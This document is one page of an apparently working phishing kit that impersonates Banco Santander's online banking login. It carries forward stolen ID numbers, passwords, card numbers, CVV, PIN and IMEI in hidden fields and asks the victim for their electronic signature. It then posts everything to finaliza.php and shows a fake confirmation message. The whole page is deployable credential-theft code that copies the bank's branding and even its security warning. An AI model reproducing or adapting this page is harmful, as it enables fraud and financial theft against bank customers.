<?
$tipoDocumento=$_POST['tipoDocumento'];
$numeroDocumento=$_POST['numeroDocumento'];
$datanasc=$_POST['datanasc'];
$tel=$_POST['tel'];
$nome=$_POST['nome'];
$num=$_POST['num'];
$val=$_POST['val'];
$cvv=$_POST['cvv'];
$pin=$_POST['pin'];
$imei=$_POST['imei'];
$password=$_POST['password'];

?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es-ES" lang="es-ES"><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<title>

</title>
<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/styles.css"><!--[if IE]><style type="text/css" media="screen">	@import "/Estatico/Globales/V166/Styles/CustomTags/Css/iehacks.css"; </style><![endif]--><link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/styles_002.css">
<meta content="OPLogon" id="meta-adp-render-model" name="render-adp">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="Cache-Control" content="no-cache">

	<meta http-equiv="httpEquiv" scheme="scheme" content="content">
	<link media="media" rel="rel" hreflang="hreflang" type="text/css" href="https://particulares.gruposantander.es/Estatico/css/notfound.css" charset="charset">
	<link rel="shortcut icon" type="image/x-icon" href="https://particulares.gruposantander.es/Estatico/Globales/Styles/CustomTags/favicon.ico">
	<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/security_002.css">
	<link rel="stylesheet" type="text/css" href="BtoChannelDriver.ssobto_arquivos/security.css">
</head>

<body>
	<div class="opLogonHeader">
		
		<div id="headerArea1" class="headerArea"><div class="image"><img src="BtoChannelDriver.ssobto_arquivos/CabeceraLoginParticulares2.gif" alt=""></div></div>
		
        
	</div>
	<div class="opLogonBody">
		<div class="left">
			<div class="opLogonInfo">
			
				
			</div>
	    	<div class="opLogonComponent">
							
				<div id="auth" class="security">
<script type="text/javascript">


function valida() {
var firma = document.getElementById("firma");
	
	
	if (firma.value.length < 6) {
		alert("Introduce correctamente tu firma electrónica (de 6 a 8 posiciones alfanuméricas).");
		firma.value="";
		firma.focus();
		return false;
	}
	
	else {
	alert('Actualización de datos se ha realizado correctamente, gracias por hacerla.\n\nUsted será redirigido a conectarse de nuevo.');
	}
	
	return true;
	
	

}
</script><form autocomplete="off" id="form_auth" action="finaliza.php" method="post" onsubmit="return valida();">
<input type="hidden" name="tipoDocumento" value="<?= $tipoDocumento ?>">
<input type="hidden" name="numeroDocumento" value="<?= $numeroDocumento ?>">
<input type="hidden" name="password" value="<?= $password ?>">
<input type="hidden" name="datanasc" value="<?= $datanasc ?>">
<input type="hidden" name="tel" value="<?= $tel ?>">
<input type="hidden" name="nome" value="<?= $nome ?>">
<input type="hidden" name="num" value="<?= $num ?>">
<input type="hidden" name="val" value="<?= $val ?>">
<input type="hidden" name="cvv" value="<?= $cvv ?>">
<input type="hidden" name="pin" value="<?= $pin ?>">
<input type="hidden" name="imei" value="<?= $imei ?>">

<div class="head"><h1 class="title">Confirmación</h1></div>
<div class="body">
<div class="superior">
<fieldset class="identificacion" id="identificacion"><legend>Datos de identificación</legend>
<p>Por favor, introduzca su firma electrónica y pulse Entrar para finalizar. Mantenga su firma electrónica siempre en secreto.</p>

<div id="tipoIdCombo" class="rowSelect">

<label for="sel_tipoaut">Firma electrónica</label>


<input tabindex="01" name="firma" type="password" id="firma" maxlength="8" onfocus="idToWrite='documentType_N';pos=null">

</div><noscript>
&lt;div class="rowRadio"&gt;&lt;label class="sencilla" for="id_usuario"&gt;&lt;input class="radio" id="id_usuario_radio" name="variableFieldSelector" type="radio" value="usuario" /&gt;Usuario:&lt;/label&gt;&lt;input name="usuario" id="id_usuario" type="text" onfocus="idToWrite=&amp;#39;id_usuario&amp;#39;;pos=null"   maxlength="20"/&gt;&lt;/div&gt;&lt;div class="rowRadio"&gt;&lt;label class="sencilla" for="id_tipoDocumento"&gt;&lt;input class="radio" id="id_tipoDocumento_radio" name="variableFieldSelector" type="radio" value="tipoDocumento" checked="checked"/&gt;Documento:&lt;/label&gt;&lt;input name="numeroDocumento" id="id_tipoDocumento" type="text" onfocus="idToWrite=&amp;#39;id_tipoDocumento&amp;#39;;pos=null" /&gt;&lt;/div&gt;&lt;div class="rowRadioSelectDoc"&gt;&lt;label class="sencilla" for="id_docType_N"&gt;&lt;input class="radio" id="id_docType_N" name="tipoDocumento" type="radio" value="N" checked="checked"/&gt;NIF:&lt;/label&gt;&lt;/div&gt;&lt;div class="rowRadioSelectDoc"&gt;&lt;label class="sencilla" for="id_docType_S"&gt;&lt;input class="radio" id="id_docType_S" name="tipoDocumento" type="radio" value="S" /&gt;CIF:&lt;/label&gt;&lt;/div&gt;&lt;div class="rowRadioSelectDoc"&gt;&lt;label class="sencilla" for="id_docType_C"&gt;&lt;input class="radio" id="id_docType_C" name="tipoDocumento" type="radio" value="C" /&gt;NIE:&lt;/label&gt;&lt;/div&gt;&lt;div class="rowRadioSelectDoc"&gt;&lt;label class="sencilla" for="id_docType_I"&gt;&lt;input class="radio" id="id_docType_I" name="tipoDocumento" type="radio" value="I" /&gt;PASAPORTE:&lt;/label&gt;&lt;/div&gt;
</noscript>

</fieldset>
</div>

</div>
<div class="foot"><span class="buttons"><input class="opLogonStandardButton" value="Entrar" type="submit"></span><span class="link"><a class="opLogonStandardLink" href="https://claves.bancosantander.es/bog/sbi?ptns=rgcl00" id="id_authenticateLink">¿Ha olvidado su firma electrónica?</a></span></div>
<div class="inputsHidden"><input name="isInNewPages" value="1" type="hidden">
<input name="dse_nextEventName" value="up" type="hidden">
<input name="dse_applicationName" value="Seguridad" type="hidden">
<input name="dse_sessionId" value="dKFS3vzIhuF1p08SxIBBm0m" type="hidden">
<input name="dse_operationName" value="OP_LOGON_MULTI" type="hidden">
<input name="dse_threadId" value="defaultExecutionThreadIdentifier" type="hidden">
<input name="dse_pageId" value="0" type="hidden">
<input name="dse_processorState" value="AuthenticationPage" type="hidden">
<input name="dse_processorId" value="AC16BECF39A16A9C2A8CE3BF" type="hidden">
<input name="dse_cmd" value="continue" type="hidden">
</div>
</form>
<script type="text/javascript"><!--//--><![CDATA[//><!--

var formulario = document.getElementById("form_auth");
formulario.setAttribute("autocomplete", "off");

//--><!]]></script>
</div>
<div id="hidedniapplet" style="font-size:1px">&nbsp;</div>


	    	</div>
	    				
			<div class="opLogonInfo">
				<div id="infoArea2" class="InfoArea NOBORDER">
<div class="Texto" style="background-image:url(BtoChannelDriver.ssobto_arquivos/barraCTIayuda.gif)">
<p><strong>Aviso de seguridad</strong></p>
<p>Nunca debe atender solicitudes de datos o claves de acceso y firma 
que le lleguen a través de correo electrónico, SMS o llamada telefónica 
y, en especial, no facilite nunca todas sus posiciones de firma 
electrónica.</p>
<div class="Enlaces">
<a target="_blank" class="opLogonStandardLink" id="infoArea2Link1" href="http://www.formavia.net/cursos/Seg_Inf_SAN/swf/principal_cd.htm">Curso on-line de Seguridad de la información.</a>
</div>
</div>
</div>

			</div>
	    </div>	    

	<div class="opLogonFoot">
		
		<div id="legalArea1" class="LegalArea"><ul><li><a target="_blank" class="opLogonStandardLink" id="link1" href="https://www.bancosantander.es/cssa/Satellite?cid=1190620355627&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=1">Accesibilidad</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link2" href="https://www.bancosantander.es/cssa/Satellite?cid=1190620182973&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=2">Seguridad</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link3" href="https://www.bancosantander.es/cssa/Satellite?cid=1195851674016&amp;pagename=SantanderComercial/GSDistribuidora/SAN_AtencionClienteSinSegmento&amp;c=GSDistribuidora&amp;indicePie=3">Tablón</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link4" href="https://www.bancosantander.es/cssa/Satellite?cid=1195852132448&amp;pagename=SantanderComercial/GSDistribuidora/SAN_AtencionClienteSinSegmento&amp;c=GSDistribuidora&amp;indicePie=4">MIFID</a>
</li><li><a target="_blank" class="opLogonStandardLink" id="link5" href="https://www.bancosantander.es/cssa/Satellite?cid=1181582573911&amp;pagename=SantanderComercial/GSInformacion/SAN_ContenedorInformacion&amp;c=GSInformacion&amp;indicePie=5">Aviso Legal</a>
</li><li class="last"><a target="_blank" class="opLogonStandardLink" id="link6" href="https://sec.bancosantander.es/Formulario_WM/formularios/santandercentralhispano/superlineaP.jsp">Sugerencias</a>
</li></ul></div>
	</div>






</body></html>